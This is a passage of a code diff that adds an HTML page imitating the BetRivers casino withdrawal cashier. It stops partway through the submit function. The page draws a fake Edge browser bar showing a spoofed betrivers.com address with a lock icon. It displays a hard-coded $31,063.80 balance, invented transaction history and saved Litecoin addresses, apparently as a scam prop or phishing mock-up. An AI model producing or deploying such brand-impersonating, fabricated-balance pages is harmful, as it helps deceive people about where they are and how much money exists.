@@ -1,0 +1,640 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8"/>
+<meta name="viewport" content="width=device-width,initial-scale=1"/>
+<title>BetRivers • Withdraw</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800&display=swap" rel="stylesheet">
+<style>
+  :root{
+    --bg:#ffffff; --surface:#ffffff; --panel:#f7f9fc;
+    --nav:#0e3a6d; --accent:#ffb81c; --accent2:#1a73e8;
+    --text:#0f172a; --muted:#6b7280; --border:#e5e7eb;
+    --ok:#16a34a; --warn:#f59e0b; --err:#ef4444;
+    --chip:#f3f4f6; --shadow:0 14px 40px rgba(4,18,35,.08);
+  }
+  *{box-sizing:border-box}
+  html,body{height:100%}
+  body{margin:0;background:var(--bg);color:var(--text);
+       font:14px/1.5 "Inter",system-ui,-apple-system,"Segoe UI",Roboto,Ubuntu,Helvetica,Arial}
+  button{font:inherit}
+  /* Edge-like browser bar */
+  .browser{background:#1f2329;color:#cbd5e1;padding:8px 14px;display:flex;align-items:center;gap:12px;border-bottom:1px solid #111827;box-shadow:inset 0 -1px 0 rgba(255,255,255,.04)}
+  .browser-left,.browser-right{display:flex;align-items:center;gap:6px}
+  .browser .btn{width:32px;height:32px;border-radius:999px;background:rgba(99,107,120,.2);border:1px solid transparent;display:flex;align-items:center;justify-content:center;color:#e2e8f0;cursor:pointer;transition:background .2s,border-color .2s,color .2s}
+  .browser .btn svg{width:18px;height:18px}
+  .browser .btn:hover{background:rgba(148,163,184,.22);border-color:rgba(148,163,184,.45);color:#f8fafc}
+  .browser .btn:active{background:rgba(148,163,184,.28)}
+  .addr{flex:1;display:flex;align-items:center;gap:10px;height:34px;padding:0 16px;border-radius:18px;background:#2c323c;border:1px solid #3c4450;box-shadow:inset 0 1px 0 rgba(255,255,255,.05);overflow:hidden}
+  .addr-favicon{width:16px;height:16px;border-radius:4px;background:linear-gradient(135deg,#ffb81c,#0e3a6d);color:#0b2549;font-weight:800;font-size:10px;display:flex;align-items:center;justify-content:center}
+  .addr-lock svg{width:16px;height:16px;color:#a8c5ff}
+  .addr-text{flex:1;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;color:#f8fafc;font-size:13px}
+  /* Header */
+  header{background:var(--surface);border-bottom:1px solid var(--border)}
+  .topbar{max-width:1100px;margin:0 auto;display:flex;align-items:center;gap:14px;padding:14px}
+  .logo{height:30px}
+  .nav-badge{margin-left:auto;background:rgba(255,184,28,.15);color:#8f6800;border:1px solid rgba(255,184,28,.45);
+             padding:6px 10px;border-radius:999px;font-weight:800;font-size:12px}
+  /* Layout */
+  .wrap{max-width:1100px;margin:18px auto;padding:0 14px}
+  .balance{display:grid;grid-template-columns:repeat(3,1fr);gap:10px;margin-bottom:14px}
+  .metric{background:var(--surface);border:1px solid var(--border);border-radius:12px;padding:12px 14px;display:flex;justify-content:space-between;align-items:center}
+  .metric .big{font-size:20px;font-weight:800}
+  .metric .cap{font-size:12px;color:var(--muted)}
+  .cards{display:grid;grid-template-columns:1.5fr 1fr;gap:16px}
+  .card{background:var(--surface);border:1px solid var(--border);border-radius:14px;box-shadow:var(--shadow);overflow:hidden}
+  .card .hd{padding:12px 14px;border-bottom:1px solid var(--border);display:flex;align-items:center;gap:10px}
+  .card .bd{padding:14px}
+  .row{display:flex;gap:10px;flex-wrap:wrap}
+  .row .col{flex:1;min-width:220px}
+  .label{font-size:12px;color:var(--muted);margin-bottom:6px;text-transform:uppercase;letter-spacing:.4px;font-weight:600}
+  .input,select{width:100%;padding:10px 12px;border:1px solid var(--border);border-radius:10px;background:#fff;outline:0;font:14px/1.3 Inter;color:var(--text)}
+  .input[readonly]{background:#f9fafb;color:#475569}
+  .input-static{display:flex;align-items:center;gap:8px;background:#f9fafb;border:1px solid var(--border);border-radius:10px;padding:10px 12px;font-weight:700;color:var(--text)}
+  .btn{appearance:none;border:1px solid var(--border);background:var(--accent2);color:#fff;padding:10px 14px;border-radius:10px;font-weight:800;cursor:pointer;transition:transform .15s ease,box-shadow .15s ease,background .15s ease}
+  .btn:hover{transform:translateY(-1px);box-shadow:0 8px 18px rgba(26,115,232,.22)}
+  .btn:active{transform:translateY(0);box-shadow:none}
+  .btn.ghost{background:#fff;color:#1a73e8}
+  .btn.ok{background:var(--ok);border-color:#16a34a}
+  .pill{padding:2px 8px;border-radius:999px;font-size:11px;font-weight:800;letter-spacing:.2px}
+  .s-ok{background:#dcfce7;color:#065f46;border:1px solid #86efac}
+  .s-warn{background:#fff7ed;color:#92400e;border:1px solid #fed7aa}
+  .s-err{background:#fee2e2;color:#7f1d1d;border:1px solid #fecaca}
+  .s-proc{background:#e0f2fe;color:#075985;border:1px solid #bae6fd}
+  .s-queued{background:#fef9c3;color:#854d0e;border:1px solid #fde68a}
+  .chips{display:flex;gap:8px;flex-wrap:wrap;margin-top:8px}
+  .chip{border:1px solid var(--border);background:var(--chip);padding:7px 12px;border-radius:999px;cursor:pointer;font-weight:700;transition:background .15s ease,border-color .15s ease;color:var(--text)}
+  .chip:hover{background:#e8eaed;border-color:#d1d5db}
+  .chip:active{background:#dfe3e6}
+  .chip[data-active="true"]{background:rgba(26,115,232,.12);border-color:rgba(26,115,232,.45);color:#1a73e8}
+  .methods{display:flex;gap:10px;flex-wrap:wrap}
+  .method{border:1px solid var(--border);border-radius:12px;background:#fff;padding:10px 14px;display:flex;gap:10px;align-items:center;cursor:pointer;transition:border-color .15s ease,box-shadow .18s ease,transform .18s ease;color:inherit}
+  .method svg.ico{width:20px;height:20px}
+  .method .method-text strong{display:block;font-size:13px;font-weight:800;color:var(--text)}
+  .method .method-text span{display:block;font-size:11px;color:var(--muted);font-weight:600;letter-spacing:.2px;text-transform:uppercase}
+  .method.active{border-color:rgba(26,115,232,.8);box-shadow:0 12px 26px rgba(15,64,156,.18);transform:translateY(-1px)}
+  .method:focus-visible{outline:2px solid rgba(26,115,232,.6);outline-offset:2px}
+  #manualAddr{display:none;margin-top:8px}
+  #addrHelper{display:none;margin-top:8px;font-size:12px;color:#4b5563;background:#f8fafc;border:1px dashed var(--border);padding:8px 12px;border-radius:8px}
+  table{width:100%;border-collapse:collapse}
+  th,td{padding:10px;border-bottom:1px solid var(--border);text-align:left}
+  th{font-size:12px;color:#475569}
+  tbody tr:hover{background:#f9fafb}
+  .mono{font-family:ui-monospace,SFMono-Regular,Menlo,Monaco,Consolas,"Liberation Mono","Courier New",monospace}
+  footer{max-width:1100px;margin:22px auto 40px;padding:0 14px;color:#6b7280;font-size:12px}
+  .price-caption{font-size:12px;color:#6b7280;margin-left:auto}
+  .sep{height:1px;background:var(--border);margin:10px 0}
+  .ico{width:18px;height:18px;display:inline-block;vertical-align:-3px}
+  @media(max-width:960px){
+    .cards{grid-template-columns:1fr}
+  }
+  @media(max-width:720px){
+    .browser{padding:8px}
+    .balance{grid-template-columns:1fr}
+  }
+</style>
+</head>
+<body>
+  <!-- Fake Edge bar -->
+  <div class="browser" role="presentation" aria-hidden="true">
+    <div class="browser-left">
+      <button class="btn" type="button" aria-label="Go back">
+        <svg viewBox="0 0 24 24">
+          <path d="M12.5 6.5l-5 5 5 5" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"/>
+          <path d="M7.5 11.5h9" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"/>
+        </svg>
+      </button>
+      <button class="btn" type="button" aria-label="Reload">
+        <svg viewBox="0 0 24 24">
+          <path d="M19 8.5v-4h-4" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"/>
+          <path d="M19 8.5a7 7 0 1 0 2 5" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"/>
+        </svg>
+      </button>
+    </div>
+    <div class="addr">
+      <span class="addr-favicon">B</span>
+      <span class="addr-lock" aria-hidden="true">
+        <svg viewBox="0 0 24 24" fill="none">
+          <path d="M17 11h-1V8a4 4 0 1 0-8 0v3H7a1 1 0 0 0-1 1v7a1 1 0 0 0 1 1h10a1 1 0 0 0 1-1v-7a1 1 0 0 0-1-1zm-5 6a2 2 0 1 1 0-4 2 2 0 0 1 0 4zm2-6H10V8a2 2 0 1 1 4 0v3z" fill="currentColor"/>
+        </svg>
+      </span>
+      <span class="addr-text">https://www.betrivers.com/cashier/withdraw</span>
+    </div>
+    <div class="browser-right">
+      <button class="btn" type="button" aria-label="Add to favorites">
+        <svg viewBox="0 0 24 24">
+          <path d="M12 4.3l1.88 4.21 4.62.34-3.48 3.18 1.03 4.54L12 14.9l-4.05 1.67 1.03-4.54-3.48-3.18 4.62-.34z" fill="currentColor"/>
+        </svg>
+      </button>
+      <button class="btn" type="button" aria-label="Settings">
+        <svg viewBox="0 0 24 24" fill="none">
+          <path d="M12 9.25a2.75 2.75 0 1 0 0 5.5 2.75 2.75 0 0 0 0-5.5z" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"/>
+          <path d="M19.4 12.98c.04-.32.06-.64.06-.98s-.02-.66-.06-.98l2.02-1.58a.5.5 0 0 0 .12-.63l-1.91-3.3a.5.5 0 0 0-.6-.22l-2.38.96a7.05 7.05 0 0 0-1.7-.98l-.36-2.53A.5.5 0 0 0 14.1 2h-3.8a.5.5 0 0 0-.5.43l-.36 2.53c-.63.25-1.21.57-1.74.96l-2.38-.96a.5.5 0 0 0-.6.22l-1.91 3.3a.5.5 0 0 0 .12.63l2.02 1.58c-.04.32-.06.64-.06.98s.02.66.06.98l-2.02 1.58a.5.5 0 0 0-.12.63l1.91 3.3a.5.5 0 0 0 .6.22l2.38-.96c.53.39 1.11.71 1.74.96l.36 2.53a.5.5 0 0 0 .5.43h3.8a.5.5 0 0 0 .5-.43l.36-2.53c.63-.25 1.21-.57 1.74-.96l2.38.96a.5.5 0 0 0 .6-.22l1.91-3.3a.5.5 0 0 0-.12-.63L19.4 12.98z" stroke="currentColor" stroke-width="1.4" stroke-linecap="round" stroke-linejoin="round"/>
+        </svg>
+      </button>
+    </div>
+  </div>
+
+  <!-- Header -->
+  <header>
+    <div class="topbar">
+      <img class="logo" alt="BetRivers" src="https://oh.betrivers.com/cms/navigationAssets/logo.svg">
+      <div style="font-weight:800">Cashier</div>
+      <span class="nav-badge">WITHDRAW</span>
+    </div>
+  </header>
+
+  <div class="wrap">
+    <!-- Balance summary -->
+    <div class="balance" id="balanceRow">
+      <div class="metric">
+        <div>
+          <div class="cap">TOTAL BALANCE</div>
+          <div class="big" id="totalBal">$31,063.80</div>
+        </div>
+        <button class="btn ghost" id="refreshBtn">Refresh</button>
+      </div>
+      <div class="metric" style="position:relative">
+        <div>
+          <div class="cap">AVAILABLE TO WITHDRAW</div>
+          <div class="big" id="availBal">$31,063.80</div>
+        </div>
+        <div class="price-caption" id="pricesAge">Live prices — updating…</div>
+      </div>
+      <div class="metric">
+        <div>
+          <div class="cap">PENDING WITHDRAWALS (LOCKED)</div>
+          <div class="big" id="pendingBal">$0.00</div>
+        </div>
+      </div>
+    </div>
+
+    <div class="cards">
+      <!-- Withdraw form (wider) -->
+      <div class="card" id="withdrawCard">
+        <div class="hd">
+          <div style="font-weight:800">Withdraw funds</div>
+          <div style="margin-left:auto;font-size:12px;color:#6b7280" id="liveClock">—</div>
+        </div>
+        <div class="bd">
+          <div class="methods" id="methodButtons" style="margin-bottom:10px">
+            <button type="button" class="method active" data-asset="LTC" aria-pressed="true">
+              <svg class="ico" viewBox="0 0 24 24" aria-hidden="true">
+                <circle cx="12" cy="12" r="12" fill="#345c9c"/>
+                <path d="M13.6 6.2l-1.2 4.4 1.6-.5-.4 1.5-1.6.5-.9 3.3h6.1l-.5 2H7.4l1.2-4.4-1.4.4.4-1.5 1.4-.4 1.3-4.8h3.3z" fill="#fff"/>
+              </svg>
+              <div class="method-text">
+                <strong>LTC</strong>
+                <span>Litecoin</span>
+              </div>
+            </button>
+            <button type="button" class="method" data-asset="BTC" aria-pressed="false">
+              <svg class="ico" viewBox="0 0 24 24" aria-hidden="true">
+                <circle cx="12" cy="12" r="12" fill="#f7931a"/>
+                <path d="M13.7 7.1c1.2.3 1.9 1 1.9 2 0 .9-.5 1.6-1.5 1.9 1.2.3 2 1.1 2 2.2 0 1.4-1.1 2.3-2.9 2.4v1.3h-1.5v-1.2h-1v1.2H9.2v-1.3H7.9l.2-1.3h1.1l.5-1.9H8.4l.3-1.3h1.6l.6-2.1H9.6l.3-1.3h1.6V6h1.5v1.1h.7zm-2.6 5.1l-.6 2.2h1.6c1 0 1.6-.4 1.6-1 0-.7-.6-1.2-1.7-1.2h-.9zm.8-3.4l-.6 2h1.4c.9 0 1.4-.4 1.4-1 0-.6-.5-1-1.3-1H11.9z" fill="#fff"/>
+              </svg>
+              <div class="method-text">
+                <strong>BTC</strong>
+                <span>Bitcoin</span>
+              </div>
+            </button>
+            <button type="button" class="method" data-asset="SOL" aria-pressed="false">
+              <svg class="ico" viewBox="0 0 24 24" aria-hidden="true">
+                <defs>
+                  <linearGradient id="grad-sol-card" x1="0" y1="0" x2="1" y2="1">
+                    <stop offset="0" stop-color="#00ffa3"/>
+                    <stop offset="1" stop-color="#dc1fff"/>
+                  </linearGradient>
+                </defs>
+                <rect width="24" height="24" rx="12" fill="#141414"/>
+                <path d="M6 8h12l-2 2H4zM6 12h12l-2 2H4zM6 16h12l-2 2H4z" fill="url(#grad-sol-card)"/>
+              </svg>
+              <div class="method-text">
+                <strong>SOL</strong>
+                <span>Solana</span>
+              </div>
+            </button>
+            <button type="button" class="method" data-asset="USDT" aria-pressed="false">
+              <svg class="ico" viewBox="0 0 24 24" aria-hidden="true">
+                <circle cx="12" cy="12" r="12" fill="#26a17b"/>
+                <path d="M6 7h12v2h-4.7v2.1c2.4.1 4 .5 4 .9 0 .6-3 1.1-6.3 1.1S4.8 12.6 4.8 12c0-.4 1.6-.8 4-.9V9H6V7zm6.1 6.3c3.5 0 6.3-.5 6.3-1.1 0-.3-1.5-.7-3.9-.8v1.3c-1 .1-1.6.2-2.4.2-.8 0-1.4-.1-2.4-.2v-1.3c-2.4.1-3.9.5-3.9.8 0 .6 2.8 1.1 6.3 1.1z" fill="#fff"/>
+              </svg>
+              <div class="method-text">
+                <strong>USDT</strong>
+                <span>Tether</span>
+              </div>
+            </button>
+            <button type="button" class="method" data-asset="ACH" aria-pressed="false">
+              <svg class="ico" viewBox="0 0 24 24" aria-hidden="true">
+                <rect width="24" height="24" rx="12" fill="#0e3a6d"/>
+                <path d="M6 12h12v6H6z" fill="#fff"/>
+                <path d="M7 9h10v2H7z" fill="#ffb81c"/>
+              </svg>
+              <div class="method-text">
+                <strong>ACH</strong>
+                <span>Bank</span>
+              </div>
+            </button>
+          </div>
+
+          <div class="row">
+            <div class="col">
+              <div class="label">Selected method</div>
+              <div id="methodDisplay" class="input-static">LTC (Litecoin)</div>
+            </div>
+            <div class="col" id="networkWrap" style="display:none">
+              <div class="label">USDT Network</div>
+              <select id="usdtNet" class="input">
+                <option value="TRC20" selected>TRC20 (Low fee)</option>
+                <option value="ERC20">ERC20</option>
+                <option value="SPL">SPL (Solana)</option>
+              </select>
+            </div>
+            <div class="col" id="bankWrap" style="display:none">
+              <div class="label">Bank account</div>
+              <input class="input" id="bankInfo" placeholder="Wells Fargo ••••5827 (on file)"/>
+            </div>
+          </div>
+
+          <div id="addrBlock">
+            <div class="label" style="margin-top:10px">Crypto address</div>
+            <select id="addrSel" class="input mono"></select>
+            <input id="manualAddr" class="input mono" placeholder="Paste address">
+            <div class="chips" id="addrChips"></div>
+            <div id="addrHelper"></div>
+            <div class="sep"></div>
+          </div>
+
+          <div class="row" style="margin-top:12px">
+            <div class="col">
+              <div class="label">Amount (USD)</div>
+              <input id="amtUsd" class="input" placeholder="0.00" inputmode="decimal">
+              <div class="chips" id="quickAmounts">
+                <button type="button" class="chip" data-amt="300">$300</button>
+                <button type="button" class="chip" data-amt="500">$500</button>
+                <button type="button" class="chip" data-amt="1000">$1,000</button>
+                <button type="button" class="chip" data-amt="2000">$2,000</button>
+                <button type="button" class="chip" data-amt="max">Max</button>
+              </div>
+            </div>
+            <div class="col">
+              <div class="label">You'll send (estimated)</div>
+              <input id="amtCoin" class="input mono" readonly value="—">
+            </div>
+          </div>
+
+          <div class="row" style="margin-top:12px">
+            <div class="col">
+              <div class="label">Fees (estimate)</div>
+              <div id="feeBox" class="input" style="display:flex;justify-content:space-between">
+                <span>—</span><span class="mono">—</span>
+              </div>
+            </div>
+            <div class="col">
+              <div class="label">Payout after fees (est.)</div>
+              <input id="payoutEst" class="input mono" readonly value="—">
+            </div>
+          </div>
+
+          <div class="row" style="margin-top:12px;align-items:center">
+            <div class="col">
+              <button class="btn" id="submitBtn">Submit withdrawal</button>
+              <button class="btn ghost" id="ratesBtn">Refresh prices</button>
+            </div>
+            <div class="col" style="text-align:right">
+              <span style="font-size:12px;color:#6b7280">Large transactions (&gt;$1,000) may require additional verification.</span>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Transactions -->
+      <div class="card">
+        <div class="hd"><div style="font-weight:800">Transactions</div></div>
+        <div class="bd" style="padding:0">
+          <table id="histTable">
+            <thead>
+              <tr>
+                <th>Time</th><th>Method</th><th>USD</th><th>Coin</th><th>To / Details</th><th>Status</th><th>Ref</th>
+              </tr>
+            </thead>
+            <tbody id="histBody"></tbody>
+          </table>
+        </div>
+      </div>
+    </div>
+
+    <div class="card" style="margin-top:16px">
+      <div class="hd"><div style="font-weight:800">Withdrawal Methods</div></div>
+      <div class="bd">
+        <div class="methods">
+          <div class="method" style="cursor:default">
+            <svg class="ico" viewBox="0 0 24 24" aria-hidden="true">
+              <circle cx="12" cy="12" r="12" fill="#345c9c"/>
+              <path d="M13.6 6.2l-1.2 4.4 1.6-.5-.4 1.5-1.6.5-.9 3.3h6.1l-.5 2H7.4l1.2-4.4-1.4.4.4-1.5 1.4-.4 1.3-4.8h3.3z" fill="#fff"/>
+            </svg>Litecoin
+          </div>
+          <div class="method" style="cursor:default">
+            <svg class="ico" viewBox="0 0 24 24" aria-hidden="true">
+              <circle cx="12" cy="12" r="12" fill="#f7931a"/>
+              <path d="M13.7 7.1c1.2.3 1.9 1 1.9 2 0 .9-.5 1.6-1.5 1.9 1.2.3 2 1.1 2 2.2 0 1.4-1.1 2.3-2.9 2.4v1.3h-1.5v-1.2h-1v1.2H9.2v-1.3H7.9l.2-1.3h1.1l.5-1.9H8.4l.3-1.3h1.6l.6-2.1H9.6l.3-1.3h1.6V6h1.5v1.1h.7z" fill="#fff"/>
+            </svg>Bitcoin
+          </div>
+          <div class="method" style="cursor:default">
+            <svg class="ico" viewBox="0 0 24 24" aria-hidden="true">
+              <defs>
+                <linearGradient id="grad-sol-ways" x1="0" y1="0" x2="1" y2="1">
+                  <stop offset="0" stop-color="#00ffa3"/>
+                  <stop offset="1" stop-color="#dc1fff"/>
+                </linearGradient>
+              </defs>
+              <rect width="24" height="24" rx="12" fill="#141414"/>
+              <path d="M6 8h12l-2 2H4zM6 12h12l-2 2H4zM6 16h12l-2 2H4z" fill="url(#grad-sol-ways)"/>
+            </svg>Solana
+          </div>
+          <div class="method" style="cursor:default">
+            <svg class="ico" viewBox="0 0 24 24" aria-hidden="true">
+              <circle cx="12" cy="12" r="12" fill="#26a17b"/>
+              <path d="M6 7h12v2h-4.7v2.1c2.4.1 4 .5 4 .9 0 .6-3 1.1-6.3 1.1S4.8 12.6 4.8 12c0-.4 1.6-.8 4-.9V9H6V7zm6.1 6.3c3.5 0 6.3-.5 6.3-1.1 0-.3-1.5-.7-3.9-.8v1.3c-1 .1-1.6.2-2.4.2-.8 0-1.4-.1-2.4-.2v-1.3c-2.4.1-3.9.5-3.9.8 0 .6 2.8 1.1 6.3 1.1z" fill="#fff"/>
+            </svg>Tether (USDT)
+          </div>
+          <div class="method" style="cursor:default">
+            <svg class="ico" viewBox="0 0 24 24" aria-hidden="true">
+              <rect width="24" height="24" rx="12" fill="#0e3a6d"/>
+              <path d="M6 12h12v6H6z" fill="#fff"/>
+              <path d="M7 9h10v2H7z" fill="#ffb81c"/>
+            </svg>ACH Transfer
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <footer>Live cryptocurrency pricing provided by Coinbase and CoinGecko. All transactions are subject to verification and compliance review. Network fees may vary based on blockchain conditions.</footer>
+
+<script>
+  const $=q=>document.querySelector(q), $$=q=>document.querySelectorAll(q);
+
+  // Clock (no timezone suffix)
+  function fmtClock(d=new Date()){
+    let h=d.getHours(), m=String(d.getMinutes()).padStart(2,'0'), s=String(d.getSeconds()).padStart(2,'0');
+    const ampm=h>=12?'PM':'AM'; h=h%12||12; return `${h}:${m}:${s} ${ampm}`;
+  }
+  function tick(){ document.getElementById('liveClock').textContent = fmtClock(); }
+  setInterval(tick,1000); tick();
+
+  const fmtUSD=n=>(n<0?'-':'')+'$'+Math.abs(n).toLocaleString(undefined,{minimumFractionDigits:2,maximumFractionDigits:2});
+  const fmtCoin=(n,s)=>`${Number(n).toFixed(8)} ${s}`;
+  const short=a=>a.length>16?`${a.slice(0,8)}…${a.slice(-6)}`:a;
+
+  const METHOD_META={
+    LTC:{display:'LTC (Litecoin)',label:'Litecoin'},
+    BTC:{display:'BTC (Bitcoin)',label:'Bitcoin'},
+    SOL:{display:'SOL (Solana)',label:'Solana'},
+    USDT:{display:'USDT (Tether)',label:'Tether'},
+    ACH:{display:'ACH (Bank Transfer)',label:'ACH bank transfer'}
+  };
+
+  let currentAsset='LTC';
+
+  const STATE={
+    total:31063.80, pendingLocked:0, available:31063.80,
+    prices:{BTC:null,LTC:null,SOL:null,USDT:null,last:null},
+    saved:{LTC:[
+      {label:'Primary Wallet',addr:'LZ8rVxkq3aQ3E1DqN9n5aVZP4Zs9mG9VYb'},
+      {label:'Secondary Wallet',addr:'LQaMp5D37MdqGASMPuRQ2T4k5ueydTUr9F'},
+      {label:'Savings Wallet',addr:'LR7qcDADQBReDqd5zpfZPKhTE3VQ7Nk2zu'},
+      {label:'Trading Wallet',addr:'LgdhigA3Zc8AAR61uAJcEfXVUcs5MzDpiS'}
+    ]},
+    history:[]
+  };
+
+  // Seed: three canceled LTC batch + deposits
+  STATE.history.push(
+    {t:'3:10 AM 11/07/2025',method:'LTC',usd:300,coin:3.73971578,to:'LQaMp5D37MdqGASMPuRQ2T4k5ueydTUr9F',status:'Canceled',note:'Withdrawal canceled by user',ref:'BR-7P6C10'},
+    {t:'3:18 AM 11/07/2025',method:'LTC',usd:300,coin:3.73971578,to:'LR7qcDADQBReDqd5zpfZPKhTE3VQ7Nk2zu',status:'Canceled',note:'Verification required',ref:'BR-8Q1D18'},
+    {t:'3:26 AM 11/07/2025',method:'LTC',usd:300,coin:3.73971578,to:'LgdhigA3Zc8AAR61uAJcEfXVUcs5MzDpiS',status:'Canceled',note:'Insufficient verification',ref:'BR-9Z4M26'},
+    {t:'11:12 AM 11/07/2025',method:'LTC',usd:+2000,coin:null,to:'Deposit (Primary Wallet)',status:'Confirmed',note:'Inbound transfer',ref:'DEP-1107A'},
+    {t:'2:35 PM 11/07/2025',method:'LTC',usd:+1500,coin:null,to:'Deposit (Primary Wallet)',status:'Confirmed',note:'Inbound transfer',ref:'DEP-1107B'},
+    {t:'7:52 PM 11/07/2025',method:'LTC',usd:+1000,coin:null,to:'Deposit (Primary Wallet)',status:'Confirmed',note:'Inbound transfer',ref:'DEP-1107C'},
+    {t:'10:08 AM 11/08/2025',method:'LTC',usd:+530,coin:null,to:'Deposit (Primary Wallet)',status:'Confirmed',note:'Inbound transfer',ref:'DEP-1108A'},
+    {t:'1:44 PM 11/08/2025',method:'LTC',usd:+2000,coin:null,to:'Deposit (Primary Wallet)',status:'Confirmed',note:'Inbound transfer',ref:'DEP-1108B'}
+  );
+
+  function recompute(){
+    let dep=0, wdC=0, lock=0;
+    for(const r of STATE.history){
+      if(r.usd>0 && r.status==='Confirmed') dep+=r.usd;
+      if(r.usd<0){
+        const a=Math.abs(r.usd);
+        if(r.status==='Confirmed') wdC+=a;
+        if(r.status==='Processing'||r.status==='Queued for review') lock+=a;
+      }
+    }
+    const base=31063.80+dep-wdC;
+    STATE.total=+base.toFixed(2); STATE.pendingLocked=+lock.toFixed(2);
+    STATE.available=+(STATE.total-STATE.pendingLocked).toFixed(2);
+    $('#totalBal').textContent=fmtUSD(STATE.total);
+    $('#pendingBal').textContent=fmtUSD(STATE.pendingLocked);
+    $('#availBal').textContent=fmtUSD(STATE.available);
+  }
+
+  function renderHistory(){
+    const tb=$('#histBody'); tb.innerHTML='';
+    for(const r of STATE.history.slice().reverse()){
+      const pill=r.status==='Confirmed' ? 's-ok' :
+                 r.status==='Processing'? 's-proc' :
+                 r.status==='Queued for review'? 's-queued' : 's-err';
+      const coin=r.coin!=null?fmtCoin(Math.abs(r.coin),r.method):'—';
+      const tr=document.createElement('tr');
+      tr.innerHTML=`<td>${r.t}</td>
+        <td>${r.method}</td>
+        <td>${fmtUSD(Math.abs(r.usd))}</td>
+        <td class="mono">${coin}</td>
+        <td class="mono" title="${r.note||''}">${r.to?short(r.to):'—'}${r.note?` • ${r.note}`:''}</td>
+        <td><span class="pill ${pill}">${r.status}</span></td>
+        <td class="mono">${r.ref||'—'}</td>`;
+      tb.appendChild(tr);
+    }
+  }
+
+  function loadSavedAddrs(){
+    const asset=currentAsset;
+    const block=$('#addrBlock');
+    const sel=$('#addrSel');
+    const manual=$('#manualAddr');
+    const chips=$('#addrChips');
+    const helper=$('#addrHelper');
+
+    chips.innerHTML='';
+    helper.style.display='none';
+    helper.textContent='';
+
+    if(asset==='ACH'){
+      block.style.display='none';
+      sel.innerHTML='';
+      manual.value='';
+      return;
+    }
+
+    block.style.display='';
+    if(asset==='LTC'){
+      sel.style.display='';
+      manual.style.display='none';
+      sel.disabled=false;
+      sel.innerHTML='';
+      const saved=STATE.saved.LTC||[];
+      saved.forEach((s,idx)=>{
+        const o=document.createElement('option');
+        o.value=s.addr; o.text=`${s.label} — ${short(s.addr)}`;
+        sel.appendChild(o);
+        const chip=document.createElement('button');
+        chip.type='button';
+        chip.className='chip';
+        chip.textContent=s.label;
+        chip.addEventListener('click',()=>{sel.value=s.addr;});
+        chips.appendChild(chip);
+      });
+      if(saved.length){ sel.value=saved[0].addr; }
+      chips.style.display=saved.length?'flex':'none';
+    }else{
+      sel.style.display='none';
+      sel.innerHTML='';
+      manual.style.display='';
+      manual.placeholder=`Paste ${METHOD_META[asset].label} address`;
+      manual.value='';
+      chips.style.display='none';
+      helper.textContent=`Enter the ${METHOD_META[asset].label} address where you want to receive this withdrawal.`;
+      helper.style.display='block';
+    }
+  }
+
+  function feeModel(asset,usd){
+    const proc=Math.min(usd*0.009,10);
+    const network=({BTC:3.5,LTC:0.25,SOL:0.02,USDT:($('#usdtNet').value==='ERC20'?4:$('#usdtNet').value==='TRC20'?0.45:0.06)})[asset]||0;
+    return {proc:+proc.toFixed(2),network:+network.toFixed(2),total:+(proc+network).toFixed(2)};
+  }
+
+  // Pricing
+  async function coinbase(pair){ try{const r=await fetch(`https://api.coinbase.com/v2/prices/${pair}/spot`); const j=await r.json(); return parseFloat(j?.data?.amount)||null;}catch(e){return null} }
+  async function coingecko(ids){ try{const r=await fetch(`https://api.coingecko.com/api/v3/simple/price?ids=${ids}&vs_currencies=usd`); return await r.json(); }catch(e){ return null; } }
+  async function loadPrices(){
+    const [b,l,s,u]=await Promise.all([coinbase('BTC-USD'),coinbase('LTC-USD'),coinbase('SOL-USD'),coinbase('USDT-USD')]);
+    if(b!=null) STATE.prices.BTC=b; if(l!=null) STATE.prices.LTC=l; if(s!=null) STATE.prices.SOL=s; if(u!=null) STATE.prices.USDT=u;
+    if(STATE.prices.BTC==null||STATE.prices.LTC==null||STATE.prices.SOL==null||STATE.prices.USDT==null){
+      const j=await coingecko('bitcoin,litecoin,solana,tether');
+      if(STATE.prices.BTC==null && j?.bitcoin) STATE.prices.BTC=j.bitcoin.usd;
+      if(STATE.prices.LTC==null && j?.litecoin) STATE.prices.LTC=j.litecoin.usd;
+      if(STATE.prices.SOL==null && j?.solana) STATE.prices.SOL=j.solana.usd;
+      if(STATE.prices.USDT==null && j?.tether) STATE.prices.USDT=j.tether.usd;
+    }
+    STATE.prices.last=new Date();
+    $('#pricesAge').textContent=`Live prices • Updated ${fmtClock(STATE.prices.last)}`;
+    updateCalc();
+  }
+  const price=(sym)=>STATE.prices[sym]||null;
+
+  function updateCalc(){
+    const asset=currentAsset;
+    const usd=parseFloat($('#amtUsd').value.replace(/,/g,''))||0;
+    if(asset==='ACH'){
+      $('#feeBox').innerHTML=`<span>ACH fee</span><span class="mono">$0.00</span>`;
+      $('#amtCoin').value='—'; $('#payoutEst').value=fmtUSD(usd); return;
+    }
+    const p=price(asset);
+    if(!p || !usd){
+      $('#amtCoin').value='—';
+      $('#payoutEst').value=usd?fmtUSD(usd):'—';
+      $('#feeBox').innerHTML=`<span>—</span><span class="mono">—</span>`;
+      return;
+    }
+    const coin=usd/p; const f=feeModel(asset,usd); const after=Math.max(0,usd-f.total);
+    $('#feeBox').innerHTML=`<span>Processing + network</span><span class="mono">${fmtUSD(f.proc)} + ${fmtUSD(f.network)} = ${fmtUSD(f.total)}</span>`;
+    $('#amtCoin').value=fmtCoin(coin,asset); $('#payoutEst').value=fmtUSD(after);
+  }
+
+  function submit(){
+    const asset=currentAsset;
+    const usd=parseFloat($('#amtUsd').value.replace(/,/g,''))||0;
+    if(usd<=0) return alert('Enter an amount');
+    if(usd>STATE.available) return alert('Amount exceeds available balance');
+
+    let destination='';
